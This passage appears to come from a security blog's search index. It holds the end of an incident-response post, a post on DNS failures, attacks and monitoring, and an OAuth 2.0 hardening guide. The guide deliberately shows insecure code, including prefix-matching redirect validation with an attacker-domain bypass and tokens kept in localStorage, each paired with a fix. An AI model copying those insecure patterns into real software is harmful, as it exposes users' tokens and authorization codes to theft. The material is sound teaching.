Revoke all sessions and tokens Rotate credentials Check what the account accessed (audit logs) Check for persistence (new SSH keys, new API keys, forwarding rules) Compromised host Isolate from network (don\u0026rsquo;t power off) Snapshot disk and memory if possible Check for lateral movement (did they pivot?) Check outbound connections (where were they talking to?) Check persistence (cron, systemd, SSH keys, modified binaries) Leaked credentials Rotate immediately Check if they were used (audit logs) Identify scope (what does this credential access?) Check for secondary compromise (did they use the creds to get further access?) Find the source (where were they leaked? Git repo? Log file? Slack message?) Cloud resource compromise Restrict IAM permissions (don\u0026rsquo;t delete the role - you need it for investigation) Revoke temporary credentials (STS sessions in AWS) Check CloudTrail/Activity Log for actions taken Snapshot affected resources Check for new resources created (instances, users, keys, buckets) Post-Incident: The Part Everyone Skips The incident is over. Systems are restored. Everyone\u0026rsquo;s tired. Nobody wants to sit in a meeting about it.\nDo the post-mortem anyway.\nWhat a useful post-mortem covers Timeline: What happened, when, in order. Not from memory. From logs and the scribe notes. Detection: How was it detected? How long was the gap between start and detection? Response: What worked? What didn\u0026rsquo;t? Where did we waste time? Root cause: Why did it happen? Not just \u0026ldquo;attacker exploited vulnerability\u0026rdquo; but \u0026ldquo;why was that vulnerability there, why wasn\u0026rsquo;t it patched, why didn\u0026rsquo;t we detect it sooner?\u0026rdquo; Actions: Specific, owned, time-bound actions to prevent recurrence What a useless post-mortem looks like Blame session disguised as a review \u0026ldquo;Lessons learned\u0026rdquo; that nobody follows up on Actions assigned to \u0026ldquo;the team\u0026rdquo; with no deadline The same post-mortem as last time because nothing changed Blameless doesn\u0026rsquo;t mean accountability-free Blameless post-mortems are about not punishing individuals for systemic failures. They\u0026rsquo;re not about pretending nobody made mistakes.\n\u0026ldquo;The deploy script didn\u0026rsquo;t check for the config error\u0026rdquo; is blameless.\n\u0026ldquo;Nobody\u0026rsquo;s responsible for the deploy script being broken\u0026rdquo; is not blameless. It\u0026rsquo;s useless.\nSomeone needs to own the fix. With a deadline. And someone needs to check it happened.\nBuilding the Muscle Incident response is a skill. Skills atrophy without practice.\nTabletop exercises: Run through scenarios without touching systems. \u0026ldquo;It\u0026rsquo;s Tuesday morning. You get an alert that\u0026hellip;\u0026rdquo; Walk through the response. Find the gaps.\nDo this quarterly. It takes two hours. It\u0026rsquo;s worth more than a hundred pages of documentation.\nGame days: Actually simulate incidents in a test environment. Kill a service. Inject suspicious traffic. See how the team responds.\nHarder to organise. Much more valuable.\nOn-call rotations: If your security team doesn\u0026rsquo;t do on-call, your incident response will be slow. The people who respond to incidents need to be comfortable being woken up and making decisions under pressure.\nThe Boring Truth Incident response isn\u0026rsquo;t about having the best tools or the cleverest analysts. It\u0026rsquo;s about:\nContaining fast (minutes, not hours) Communicating clearly (facts, not speculation) Investigating methodically (timeline, scope, impact, vector) Following up properly (actions that actually happen) Most of it is process. Most of that process is boring. The boring process is what stops a contained incident from becoming front-page news.\nHave a plan. Practise the plan. Accept that the plan won\u0026rsquo;t survive contact with reality. Adapt.\nAnd keep your phone charged. The 3am call is coming.\nFor AI-specific incident response (where \u0026ldquo;I don\u0026rsquo;t know why it\u0026rsquo;s wrong\u0026rdquo; is the honest answer), see the AI series Part 3. For monitoring that gives you something to investigate, the Prometheus post and the DNS security post cover the signals worth watching.\n","date":"2 Jul 2025","permalink":"https://gazsecops.github.io/posts/incident-response-what-actually-works/","summary":"\u003cdiv class=\"dialogue\"\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-oncall\"\u003eOn-call:\u003c/span\u003e I\u0026rsquo;m getting paged. Something about unusual outbound traffic.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-management\"\u003eManagement:\u003c/span\u003e Is it a breach?\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-oncall\"\u003eOn-call:\u003c/span\u003e I don\u0026rsquo;t know yet. I\u0026rsquo;ve been awake for forty seconds.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-management\"\u003eManagement:\u003c/span\u003e We need to tell the board by 8am.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-oncall\"\u003eOn-call:\u003c/span\u003e I need to tell you what\u0026rsquo;s happening first. Give me an hour.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-management\"\u003eManagement:\u003c/span\u003e You have thirty minutes.\u003c/p\u003e\n\u003c/div\u003e\n\u003cp\u003eIncident response plans look great in documents. Neat flowcharts. Escalation matrices. Communication templates. Everyone has a role. Everyone knows what to do.\u003c/p\u003e\n\u003cp\u003eThen something actually happens and none of it works the way the document said it would.\u003c/p\u003e\n\u003caside class=\"pullquote\"\u003e\nThe best incident response plan is the one your team has actually practised. The second best is any plan at all. Most teams have neither.\n\u003c/aside\u003e\n\u003cp\u003eThis post is about what incident response looks like in practice. Not the framework version. The version where you\u0026rsquo;re half awake, the logs are incomplete, and someone is asking you to confirm it\u0026rsquo;s not a breach before you\u0026rsquo;ve even found the right terminal.\u003c/p\u003e","tags":["security","incident-response","operations","linux","cloud"],"title":"Incident Response: What Actually Works at 3am"},{"content":" On-call: The website is down.\nManagement: But the servers are fine. CPU is low. No errors.\nSysadmin: Your DNS records point at last week\u0026rsquo;s IP.\nManagement: DNS is just a phone book. How can that take us down?\nSysadmin: Because your whole company uses it as the source of truth, whether you admit it or not.\nDNS is the most boring critical system you run. Nobody thinks about it until it fails, and when it fails everyone suddenly becomes very interested in TTLs.\nYou can patch servers. You can roll back deployments. You can add more replicas. None of that matters if clients can\u0026rsquo;t resolve names.\nDNS security isn\u0026rsquo;t \u0026ldquo;do DNSSEC and you\u0026rsquo;re done\u0026rdquo;. It\u0026rsquo;s availability, integrity, and watching the bits that attackers like because you usually leave them alone.\nDNS isn't a phone book. It's a control plane. This post covers how DNS breaks in the real world, how attackers use it, what you can monitor without buying a new platform, and what to do at 3am when name resolution goes sideways.\nWhat DNS Actually Is (In Practice) On paper, DNS maps names to IPs.\nIn practice, DNS is:\nHow your clients find everything (apps, APIs, identity, updates, email) A policy point (blocklists, allowlists, split-horizon) A dependency for other dependencies (PKI, OAuth redirects, package repos) A place attackers hide (because port 53 is usually allowed out) Also: caching means \u0026ldquo;we fixed it\u0026rdquo; and \u0026ldquo;users still see it broken\u0026rdquo; can both be true at the same time.\nThe Linux and Cloud DNS Stack (Where the Packets Go) If you\u0026rsquo;re running Linux and cloud workloads, you don\u0026rsquo;t have \u0026ldquo;DNS\u0026rdquo;. You have layers:\nApplication calls getaddrinfo() (or does its own thing) libc follows /etc/nsswitch.conf (files, DNS, mDNS, whatever) /etc/resolv.conf points at a local stub, or a real resolver systemd-resolved, dnsmasq, unbound, CoreDNS, or a cloud-provided resolver does the actual work In cloud networks, there\u0026rsquo;s usually a magic resolver IP.\nAWS VPC resolver: 169.254.169.253 Azure: 168.63.129.16 If a security group, NACL, or egress policy blocks that, everything breaks in ways that look unrelated.\nOn modern Linux, start with:\nresolvectl status cat /etc/resolv.conf cat /etc/nsswitch.conf In Kubernetes you add another layer:\nPod uses /etc/resolv.conf injected by kubelet CoreDNS answers cluster names and forwards everything else ndots and search paths can multiply queries and create NXDOMAIN storms How DNS Breaks (The Stuff You See Weekly) 1. Wrong record, wrong TTL, wrong place Most outages are self-inflicted:\nAn A/AAAA record points at an old load balancer A CNAME points at something that no longer exists A TTL is set to 86400 \u0026ldquo;because stability\u0026rdquo; and now you\u0026rsquo;re stuck with it Someone edits the public zone when they meant the internal zone If you only take one thing from this post: treat DNS changes like deployments. Review them, stage them, and have a rollback.\n2. Resolver problems (everything looks down) Authoritative servers can be healthy and you can still be dead if your resolvers are:\nOverloaded Misconfigured (bad forwarders, broken recursion) Dropping UDP fragments (DNS responses get larger than you think) Timing out because of upstream issues Symptoms look like \u0026ldquo;random\u0026rdquo; failures:\nOne office can\u0026rsquo;t log in Only some mobile users can\u0026rsquo;t reach the API Half your pods can\u0026rsquo;t pull images 3. MTU and fragmentation (the invisible pain) Modern DNS responses can be large:\nDNSSEC adds signatures Lots of records (or bad \u0026ldquo;kitchen sink\u0026rdquo; zones) TXT records for SPF, DKIM, verification tokens Large UDP responses fragment. Firewalls drop fragments. Clients retry over TCP. Latency spikes. Things flap.\nYou don\u0026rsquo;t need a fancy root cause. You need to look at packets.\n4. Split-horizon and private zones (cloud favourite) Cloud DNS makes it easy to have the same name mean different things in different places.\nThat is useful. It\u0026rsquo;s also how you accidentally take production down:\nPrivate zone exists but isn\u0026rsquo;t linked to the right VPC/VNet You created a private record for api.example.com and forgot the public one still points elsewhere A migration flips a CNAME to a private endpoint name and half your clients can\u0026rsquo;t resolve it Symptoms:\nWorks from inside the VPC/VNet Fails from laptops, CI runners, or the other VPC you forgot exists 5. Kubernetes DNS pain (ndots, search paths, CoreDNS) Kubernetes can turn a small DNS problem into a big one.\nCommon failure modes:\nndots:5 plus long search paths means a single lookup turns into multiple NXDOMAIN queries CoreDNS forwards to an upstream resolver that rate limits or times out NodeLocal DNSCache isn\u0026rsquo;t deployed, so every pod hammers CoreDNS directly Someone \u0026ldquo;optimises\u0026rdquo; CoreDNS and breaks forwarding How Attackers Use DNS DNS is useful to attackers because it\u0026rsquo;s everywhere and rarely monitored properly.\n1. DNS as a beacon Malware loves a simple pattern: \u0026ldquo;every 60 seconds, resolve a name and do what it says\u0026rdquo;.\nIt blends in because DNS traffic is constant. If you\u0026rsquo;re not logging it, it might as well not exist.\n2. DNS tunnelling and exfiltration If outbound TCP is locked down but DNS is wide open, attackers will use DNS for data exfiltration.\nThe easy signals:\nVery long subdomains High entropy labels (looks like base32/base64) Lots of TXT queries A single client doing hundreds of queries a minute to one domain Real numbers you can alert on:\nNXDOMAIN rate jumps from 1-3% to 20%+ TXT query share goes from ~0.1-1% to 5%+ Average query name length jumps from ~20-40 chars to 80+ 3. DNS spoofing inside your network If an attacker can control what a client resolves, they can redirect:\nSoftware updates SSO endpoints Internal APIs This isn\u0026rsquo;t always \u0026ldquo;evil nation state\u0026rdquo;. Sometimes it\u0026rsquo;s:\nSomeone stood up a rogue DHCP server A laptop runs a local DNS forwarder and starts answering queries A Wi-Fi network hands out its own resolver 4. Domain takeover by deletion This one hurts because it\u0026rsquo;s boring.\nYou delete a service. You forget the DNS records. Six months later the external resource name becomes available again (cloud storage, SaaS, whatever). Someone else claims it. Your CNAME still points at it.\nNow you have a clean, authenticated looking hostname pointing at an attacker-controlled endpoint.\nMonitoring That Actually Matters If you already read my Prometheus post, this is the same idea: monitor what tells you you\u0026rsquo;re broken, not what makes dashboards look tidy.\nYou want to monitor two things:\nDNS as a service (availability and latency) DNS as behaviour (what clients are doing) Service metrics Start with these:\nQuery rate (QPS) Latency percentiles (P50/P95/P99) SERVFAIL rate NXDOMAIN rate TCP fallback rate (if this spikes, fragmentation or upstream problems are likely) Behaviour metrics These catch attacks and misconfigurations:\nTop queried domains (internal and external) New domains seen (first time in 7 days) Query type distribution (A/AAAA vs TXT vs ANY) Query name length distribution Clients with unusually high query volume Quick cheat sheet:\nSignal Normal-ish baseline When to worry NXDOMAIN rate 1-5% 15-20%+ sustained SERVFAIL rate near zero anything sustained TCP fallback low spikes correlate with latency TXT share low sudden jump New domains depends sudden spike from one client None of these numbers are universal. They\u0026rsquo;re good starting points. Baseline your environment and alert on change.\nCollecting DNS logs without losing your mind You don\u0026rsquo;t need to store every query forever. You do need enough to answer \u0026ldquo;what changed?\u0026rdquo;.\nPractical options:\nSample logs (eg 1 in 100 queries) plus full logs on errors Full logs for internal zones only Full logs for a short retention window (eg 24-72 hours) If you can\u0026rsquo;t answer \u0026ldquo;which clients queried this domain in the last hour\u0026rdquo;, you will have a bad time during an incident.\nCloud note: if you\u0026rsquo;re using managed resolvers, turn on resolver query logging (whatever your cloud calls it) and keep at least a short retention window. It saves you from guessing.\nCloud DNS: what to switch on You want two things from cloud DNS: query logs, and change logs.\nPractical defaults:\nAWS (Route 53 Resolver): enable Resolver query logging to CloudWatch Logs (or S3) for the VPCs that matter. If you use Route 53 Resolver DNS Firewall, log the blocks. Azure: the built-in resolver doesn\u0026rsquo;t give you much visibility. If you need query logs, route DNS through something you control and can log (Azure DNS Private Resolver, Azure Firewall DNS proxy, or your own Unbound/BIND) and send diagnostics to Log Analytics. GCP: enable VPC DNS logging (DNS policy with logging enabled) so you can see what instances are asking. If you run Cloud DNS private zones, keep the zone change history and log admin activity. Defences That Work (And Don\u0026rsquo;t Require Heroics) 1. Control the resolvers Pick where clients are allowed to resolve names, then enforce it:\nBlock outbound DNS to the internet from client networks (UDP/TCP 53) Explicitly allow only your resolvers to talk out Decide how you handle DoH/DoT (more on this below) Linux and cloud version of this:\nIn VPC/VNet: only allow DNS egress to your resolver tier and the cloud resolver IPs you actually use In Kubernetes: prefer NodeLocal DNSCache, and set sane limits on CoreDNS 2. Use RPZ / DNS filtering where it helps RPZ (Response Policy Zones) is the unglamorous workhorse. You can block known bad domains at the resolver.\nExample idea (BIND style):\nresponse-policy { zone \u0026#34;rpz.local\u0026#34;; }; zone \u0026#34;rpz.local\u0026#34; { type master; file \u0026#34;/etc/bind/db.rpz.local\u0026#34;; }; Don\u0026rsquo;t pretend this stops targeted attackers. It stops commodity garbage and buys you time.\n3. DNSSEC: useful, but not a magic shield DNSSEC helps with integrity between resolvers and authoritative servers.\nIt does not:\nStop you publishing the wrong record Fix your resolver being down Stop someone inside your network handing out a rogue resolver Also, DNSSEC can make fragmentation problems worse if your network is fragile. Test it.\n4. DoH/DoT: decide what you want Browsers and clients can bypass your resolver via DNS-over-HTTPS (DoH) or DNS-over-TLS (DoT).\nIf you rely on DNS logging for detection, that bypass matters.\nYou have three choices:\nAllow it and accept reduced visibility Block known DoH endpoints and enforce your resolvers Provide your own DoH endpoint and control it None are perfect. Pick based on your threat model and the politics of your desktop team.\nIncident Response: DNS Edition This is the bit you want at 3am.\n1. Confirm it\u0026rsquo;s DNS (don\u0026rsquo;t guess) From a broken client:\ndig +time=2 +tries=1 example.com dig +time=2 +tries=1 @your-resolver-ip example.com dig +time=2 +tries=1 @1.1.1.1 example.com If querying your resolver fails but public resolvers work, your resolver path is the problem.\nIf everything fails, check connectivity and upstream.\nOn Linux, confirm the machine is using the resolver you think it is:\nresolvectl status getent hosts example.com 2. Check TTL and caching reality If you changed a record five minutes ago and TTL is one hour, the internet did not \u0026ldquo;ignore\u0026rdquo; your fix. You told it not to look again.\n3. Look for SERVFAIL, timeouts, and TCP fallback When your resolvers start falling back to TCP, latency climbs and everything downstream starts timing out.\n4. Contain and stabilise Practical stabilisation steps:\nFail over clients to a known-good resolver pool Temporarily disable DNSSEC validation if it\u0026rsquo;s breaking resolution (document it, then fix properly) Rate limit abusive clients if one host is melting your resolver 5. Hunt the cause The usual culprits:\nA broken forwarder A firewall change dropping fragments An upstream resolver outage A bad zone change One \u0026ldquo;helpful\u0026rdquo; device handing out DNS settings via DHCP Cloud and Kubernetes extras:\nSomeone blocked the cloud resolver IP in an egress policy Private zone link got removed or never existed CoreDNS is overloaded, crashlooping, or forwarding to a dead upstream The Boring Truth DNS security is not glamorous. It\u0026rsquo;s change control, visibility, and making sure name resolution keeps working when everything else is on fire.\nIf you do nothing else:\nRun your own resolvers and make clients use them Log enough to investigate incidents Alert on NXDOMAIN, SERVFAIL, and latency percentiles Treat DNS records like production config, because that\u0026rsquo;s what they are If you\u0026rsquo;re already using Prometheus, the DNS metrics fit nicely next to the rest of your ops signals. If you\u0026rsquo;re not, start small. A few graphs and three good alerts beat a SIEM rule nobody reads.\n","date":"12 Jun 2025","permalink":"https://gazsecops.github.io/posts/dns-security-what-actually-breaks/","summary":"\u003cdiv class=\"dialogue\"\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-oncall\"\u003eOn-call:\u003c/span\u003e The website is down.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-management\"\u003eManagement:\u003c/span\u003e But the servers are fine. CPU is low. No errors.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-sysadmin\"\u003eSysadmin:\u003c/span\u003e Your DNS records point at last week\u0026rsquo;s IP.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-management\"\u003eManagement:\u003c/span\u003e DNS is just a phone book. How can that take us down?\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-sysadmin\"\u003eSysadmin:\u003c/span\u003e Because your whole company uses it as the source of truth, whether you admit it or not.\u003c/p\u003e\n\u003c/div\u003e\n\u003cp\u003eDNS is the most boring critical system you run. Nobody thinks about it until it fails, and when it fails everyone suddenly becomes very interested in TTLs.\u003c/p\u003e\n\u003cp\u003eYou can patch servers. You can roll back deployments. You can add more replicas. None of that matters if clients can\u0026rsquo;t resolve names.\u003c/p\u003e\n\u003cp\u003eDNS security isn\u0026rsquo;t \u0026ldquo;do DNSSEC and you\u0026rsquo;re done\u0026rdquo;. It\u0026rsquo;s availability, integrity, and watching the bits that attackers like because you usually leave them alone.\u003c/p\u003e\n\u003caside class=\"pullquote\"\u003e\nDNS isn't a phone book. It's a control plane.\n\u003c/aside\u003e\n\u003cp\u003eThis post covers how DNS breaks in the real world, how attackers use it, what you can monitor without buying a new platform, and what to do at 3am when name resolution goes sideways.\u003c/p\u003e","tags":["security","dns","linux","cloud","monitoring","operations","incident-response"],"title":"DNS Security: What Actually Breaks"},{"content":" Engineer: We need OAuth for the new API.\nSysadmin: Have you implemented PKCE?\nEngineer: What\u0026rsquo;s PKCE?\nSysadmin: Proof Key for Code Exchange. Prevents authorisation code interception.\nEngineer: Is that the state parameter thing?\nSysadmin: No, that\u0026rsquo;s CSRF protection. Different problem.\nEngineer: \u0026hellip;we might need to start over.\nThis conversation happens constantly. OAuth 2.0 is everywhere, but most implementations get it wrong. Not spectacularly wrong. Just wrong enough to be exploitable.\n\"OAuth 2.0 isn't hard because the spec is complex. It's hard because the spec gives you enough rope to hang yourself, and most people do exactly that.\" The OAuth 2.0 specification is a framework, not a protocol. It gives you options. Most of those options are wrong for your use case. The security comes from knowing which options to pick and which to avoid.\nWhat OAuth Actually Does OAuth 2.0 is authorization, not authentication. It lets one service act on your behalf without giving away your password.\nExample: You use a photo printing service. It needs access to your photos stored on another service. OAuth lets you authorize the printer to access your photos without giving it your password.\nThat\u0026rsquo;s it. That\u0026rsquo;s what OAuth does.\nEverything else - identity, user information, authentication - is built on top via OpenID Connect.\nCommon confusion:\nEngineer: We\u0026rsquo;re using OAuth for login.\nSysadmin: OAuth doesn\u0026rsquo;t do login. It does authorization.\nEngineer: But Google OAuth gives us the user\u0026rsquo;s email.\nSysadmin: That\u0026rsquo;s OpenID Connect. Built on OAuth, but adds authentication.\nEngineer: What\u0026rsquo;s the difference?\nSysadmin: OAuth: \u0026ldquo;Can this app access your photos?\u0026rdquo; OpenID Connect: \u0026ldquo;Who are you?\u0026rdquo;\nGet this wrong and you\u0026rsquo;re solving the wrong problem with the wrong tool.\nThe Mistakes That Matter Redirect URI Validation The problem:\nOAuth works by redirecting users back to your application with an authorization code. If you don\u0026rsquo;t validate the redirect URI strictly, attackers can steal these codes.\nWhat people do:\n# Bad: Prefix matching def is_valid_redirect(registered, requested): return requested.startswith(registered) What happens:\nRegistered: https://app.example.com/callback Attack: https://app.example.com/callback.attacker.com Result: Code sent to attacker\u0026rsquo;s domain What works:\n# Good: Exact matching def is_valid_redirect(registered, requested): return registered == requested No wildcards. No substrings. Exact match.\nReal incident:\nFacebook\u0026rsquo;s OAuth implementation (2017) used prefix matching. Researchers could steal access tokens by registering domains like facebook.com.attacker.com that matched the prefix check but redirected to attacker-controlled servers.\nPKCE Missing The problem:\nAuthorization codes can be intercepted. Particularly on mobile apps or single-page applications. PKCE (Proof Key for Code Exchange) prevents the intercepted code from being useful.\nHow it works:\nGenerate random string (code_verifier) Hash it (code_challenge) Send hash with authorization request Send original string when exchanging code for token Server verifies: hash of original matches stored hash If an attacker intercepts the authorization code, they don\u0026rsquo;t have the original random string. The code is useless without it.\nWho needs PKCE:\nEveryone. Not just mobile apps.\nThe OAuth 2.1 draft spec makes PKCE mandatory for all clients. That\u0026rsquo;s how important it is.\nImplementation:\n// Generate code verifier (random string) function generateCodeVerifier() { const array = new Uint8Array(32); crypto.getRandomValues(array); return base64UrlEncode(array); } // Generate code challenge (hash of verifier) async function generateCodeChallenge(verifier) { const buffer = new TextEncoder().encode(verifier); const hash = await crypto.subtle.digest(\u0026#39;SHA-256\u0026#39;, buffer); return base64UrlEncode(new Uint8Array(hash)); } // Authorization request const verifier = generateCodeVerifier(); sessionStorage.setItem(\u0026#39;code_verifier\u0026#39;, verifier); const challenge = await generateCodeChallenge(verifier); window.location = `https://auth.example.com/authorize?` + `client_id=${clientId}\u0026amp;` + `redirect_uri=${redirectUri}\u0026amp;` + `response_type=code\u0026amp;` + `code_challenge=${challenge}\u0026amp;` + `code_challenge_method=S256`; // Token exchange (later, in callback) const storedVerifier = sessionStorage.getItem(\u0026#39;code_verifier\u0026#39;); fetch(\u0026#39;https://auth.example.com/token\u0026#39;, { method: \u0026#39;POST\u0026#39;, body: new URLSearchParams({ grant_type: \u0026#39;authorization_code\u0026#39;, code: code, redirect_uri: redirectUri, client_id: clientId, code_verifier: storedVerifier }) }); State Parameter Omitted The problem:\nCSRF attacks on OAuth flows. Attacker tricks you into authorizing their malicious app, or linking their account to yours.\nHow the attack works:\nAttacker starts OAuth flow for your account Attacker captures the authorization callback URL (with authorization code) Attacker sends you that URL (phishing email, embedded in site, etc.) You click it Your browser sends the authorization code to the attacker\u0026rsquo;s app Attacker\u0026rsquo;s app now has access to your account What prevents it:\nThe state parameter. Random value you generate, include in the authorization request, and verify in the callback.\nImplementation:\n# Generate state import secrets state = secrets.token_urlsafe(32) session[\u0026#39;oauth_state\u0026#39;] = state # Authorization URL auth_url = f\u0026#34;https://auth.example.com/authorize?\u0026#34; \\ f\u0026#34;client_id={client_id}\u0026amp;\u0026#34; \\ f\u0026#34;redirect_uri={redirect_uri}\u0026amp;\u0026#34; \\ f\u0026#34;response_type=code\u0026amp;\u0026#34; \\ f\u0026#34;state={state}\u0026#34; # Callback handler def callback(): received_state = request.args.get(\u0026#39;state\u0026#39;) stored_state = session.get(\u0026#39;oauth_state\u0026#39;) if not received_state or received_state != stored_state: return \u0026#34;Invalid state parameter\u0026#34;, 403 # Continue with token exchange ... Simple. Effective. Constantly forgotten.\nToken Storage in LocalStorage The problem:\nAccess tokens stored in localStorage are accessible to any JavaScript running on the page. Including malicious scripts injected via XSS.\nWhat people do:\n// Bad: Token accessible to any script localStorage.setItem(\u0026#39;access_token\u0026#39;, token); // Later const token = localStorage.getItem(\u0026#39;access_token\u0026#39;); fetch(\u0026#39;/api/data\u0026#39;, { headers: { \u0026#39;Authorization\u0026#39;: `Bearer ${token}` } }); What happens:\nOne XSS vulnerability anywhere on your site, and all tokens are compromised.\nWhat works:\nStore tokens server-side. Use HTTP-only cookies.\n# Server-side (Python/Flask example) @app.route(\u0026#39;/auth/callback\u0026#39;) def callback(): # Exchange code for tokens token_response = exchange_code_for_tokens(request.args.get(\u0026#39;code\u0026#39;)) # Store tokens in session (server-side) session[\u0026#39;access_token\u0026#39;] = token_response[\u0026#39;access_token\u0026#39;] session[\u0026#39;refresh_token\u0026#39;] = token_response[\u0026#39;refresh_token\u0026#39;] # Redirect to app return redirect(\u0026#39;/dashboard\u0026#39;) @app.route(\u0026#39;/api/data\u0026#39;) def get_data(): # Retrieve token from session token = session.get(\u0026#39;access_token\u0026#39;) # Use token to call backend API response = requests.get(\u0026#39;https://api.example.com/data\u0026#39;, headers={\u0026#39;Authorization\u0026#39;: f\u0026#39;Bearer {token}\u0026#39;}) return response.json() Tokens never touch the browser. XSS can\u0026rsquo;t steal them.\nAlternative for SPAs:\nBackend-for-Frontend (BFF) pattern. Your SPA talks to a thin backend you control. That backend handles OAuth and tokens. Browser only gets session cookies.\nOverly Permissive Scopes The problem:\nRequesting more permissions than you need. Increases damage if tokens are compromised. Makes users suspicious.\nWhat people do:\n// Bad: Requesting everything const scopes = \u0026#39;read write delete admin user:email repo public_repo\u0026#39;; What works:\nMinimum necessary permissions.\n// Good: Minimal scopes const scopes = \u0026#39;read:items user:email\u0026#39;; Real example:\nCambridge Analytica accessed Facebook data through an app that requested excessive permissions. Users authorized a personality quiz that asked for access to their full profile, friend list, and timeline. That data was then used for purposes users never intended.\nThe lesson: Request only what you actually need. Users shouldn\u0026rsquo;t have to trust you with their entire digital life to use your app.\nRefresh Token Rotation Not Implemented The problem:\nRefresh tokens are long-lived credentials. If stolen, they give persistent access.\nRefresh token rotation limits this. Every time you use a refresh token to get a new access token, you also get a new refresh token. The old one is invalidated.\nWhy it matters:\nWithout rotation, a stolen refresh token works forever (or until it expires, which might be months).\nWith rotation, if an attacker uses a stolen refresh token, they get ONE new access token. Then their refresh token stops working. Your legitimate app tries to use its refresh token (the same one the attacker just used), and the server detects reuse.\nDetection:\nWhen refresh token reuse is detected, revoke ALL tokens for that session. Assume compromise.\nImplementation:\nfunc handleTokenRefresh(w http.ResponseWriter, r *http.Request) { refreshToken := r.FormValue(\u0026#34;refresh_token\u0026#34;) // Validate refresh token oldToken, err := validateRefreshToken(refreshToken) if err != nil { http.Error(w, \u0026#34;Invalid refresh token\u0026#34;, 400) return } // Check for reuse (token already used before) if isTokenUsed(refreshToken) { // SECURITY BREACH: Revoke all tokens for this user revokeAllTokensForUser(oldToken.UserID) log.Printf(\u0026#34;Refresh token reuse detected: user=%s\u0026#34;, oldToken.UserID) http.Error(w, \u0026#34;Security violation\u0026#34;, 401) return } // Mark token as used markTokenAsUsed(refreshToken) // Generate NEW refresh token and access token newRefreshToken := generateRefreshToken() newAccessToken := generateAccessToken(oldToken.UserID) // Store new refresh token storeRefreshToken(newRefreshToken, oldToken.UserID) json.NewEncoder(w).Encode(map[string]string{ \u0026#34;access_token\u0026#34;: newAccessToken, \u0026#34;refresh_token\u0026#34;: newRefreshToken, \u0026#34;token_type\u0026#34;: \u0026#34;bearer\u0026#34;, }) } OpenID Connect vs OAuth 2.0 People confuse these constantly. They\u0026rsquo;re related but different.\nOAuth 2.0:\nAuthorization (what can the app do?) Gives you an access token Access token lets app call APIs on your behalf Doesn\u0026rsquo;t tell you WHO the user is OpenID Connect:\nAuthentication (who is the user?) Built on top of OAuth 2.0 Adds ID token (tells you who the user is) Adds UserInfo endpoint (get user details) When to use which:\nOAuth 2.0: \u0026ldquo;Let this app post to my social media\u0026rdquo; OpenID Connect: \u0026ldquo;Log in with Google\u0026rdquo;\nIf you\u0026rsquo;re doing \u0026ldquo;Sign in with X\u0026rdquo;, you want OpenID Connect, not plain OAuth.\nThe Bit People Mess Up: ID Token Validation OIDC gives you an ID token (id_token). It\u0026rsquo;s meant for your app.\nThe access token is meant for an API.\nIf you treat an access token as \u0026ldquo;proof the user is Alice\u0026rdquo;, you\u0026rsquo;ll eventually accept a token that was never meant for you.\nMinimum validation rules for an ID token:\nVerify signature using the IdP\u0026rsquo;s JWKS Check iss (issuer) matches your IdP Check aud includes your client ID Check exp is in the future Check nonce matches what you generated for this login Example in Go using go-oidc (this verifies the signature, issuer, audience, and lets you check nonce):\nprovider, err := oidc.NewProvider(ctx, \u0026#34;https://login.example.com\u0026#34;) if err != nil { return err } verifier := provider.Verifier(\u0026amp;oidc.Config{ClientID: \u0026#34;your-client-id\u0026#34;}) rawIDToken := r.FormValue(\u0026#34;id_token\u0026#34;) idToken, err := verifier.Verify(ctx, rawIDToken) if err != nil { return fmt.Errorf(\u0026#34;invalid id_token: %w\u0026#34;, err) } var claims struct { Subject string `json:\u0026#34;sub\u0026#34;` Email string `json:\u0026#34;email\u0026#34;` Nonce string `json:\u0026#34;nonce\u0026#34;` } if err := idToken.Claims(\u0026amp;claims); err != nil { return err } if claims.Nonce != expectedNonceFromSession { return fmt.Errorf(\u0026#34;nonce mismatch\u0026#34;) } If you don\u0026rsquo;t know what a nonce is: it\u0026rsquo;s the state parameter\u0026rsquo;s cousin. State stops CSRF in the redirect. Nonce stops replay in the ID token.\nIdentity Providers: Hosted vs Self-Hosted Hosted (Auth0, Okta, etc.):\nAdvantages:\nSomeone else\u0026rsquo;s problem Professional security team Compliance certifications Works out of the box Disadvantages:\nMonthly costs (can be significant) Vendor lock-in Data stored with third party Limited customization Self-Hosted (Keycloak, etc.):\nAdvantages:\nComplete control No ongoing fees (just infrastructure) Data stays on your servers Full customization Disadvantages:\nYou have to run it Security is your responsibility Updates are your problem High availability is your problem Most organizations should use hosted.\nUnless you have specific requirements (data sovereignty, extreme customization, huge scale), hosted is better. Running auth properly is hard. Let someone else do it.\nWhat Actually Happened Facebook (2018) - 50 million accounts compromised\nAccess tokens exposed through \u0026ldquo;View As\u0026rdquo; feature. Tokens could be used to take over accounts completely.\nRoot cause: Token exposure in client-side code + insufficient token validation.\nGoogle Docs OAuth Phishing (2017) - 1 million users\nAttackers created an app named \u0026ldquo;Google Docs\u0026rdquo; (same name as the real service). Users authorized it thinking it was Google. App gained access to email and contacts.\nRoot cause: No verification that app names aren\u0026rsquo;t impersonating official services.\nDropbox (2016) - Redirect URI validation bypass\nResearchers found Dropbox accepted redirect URIs that matched by prefix. Could redirect to attacker-controlled sites.\nRoot cause: Prefix matching instead of exact matching for redirect URIs.\nPattern:\nThese aren\u0026rsquo;t exotic attacks. They\u0026rsquo;re basic implementation mistakes. Redirect URI validation. Token storage. Input validation. Fundamentals.\nWhat To Do For new implementations:\nUse PKCE (even if you\u0026rsquo;re not a mobile app) Validate redirect URIs exactly Use state parameter Store tokens server-side (not localStorage) Request minimal scopes Implement refresh token rotation Use HTTPS everywhere For existing implementations:\nAudit redirect URI validation Check if PKCE is implemented Verify state parameter is used and validated Review token storage (is it in localStorage?) Check scope requests (are they minimal?) Test refresh token rotation 